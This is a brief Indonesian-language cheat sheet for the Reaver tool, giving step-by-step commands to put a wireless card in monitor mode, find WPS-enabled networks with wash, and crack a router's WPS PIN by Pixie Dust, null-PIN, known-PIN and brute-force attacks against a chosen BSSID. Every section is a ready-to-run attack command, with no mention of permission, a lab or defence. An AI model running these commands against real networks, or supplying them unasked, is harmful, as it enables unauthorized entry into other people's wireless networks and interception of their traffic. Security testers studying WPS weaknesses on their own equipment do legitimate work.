# Reaver

## Langkah-Langkah

#### 1. Kill semua proses yang mengganggu:

```
sudo airmon-ng check kill
```

#### 2. Aktifkan Mode Monitor:

```
sudo airmon-ng start [interface]
```

#### 3. Scan Wi-Fi yang mengaktifkan WPS:

```
sudo wash -i [interface] -s -p
```

#### 4. Jalankan Serangan:

#### Pixie Dust Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -K -vv
```

#### Null PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p "" -vv
```

#### Known PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -p [pin] -vv
```

#### Brute Force PIN Attack:

```
sudo reaver -i [interface] -b [bssid] -c [channel] -vv
```

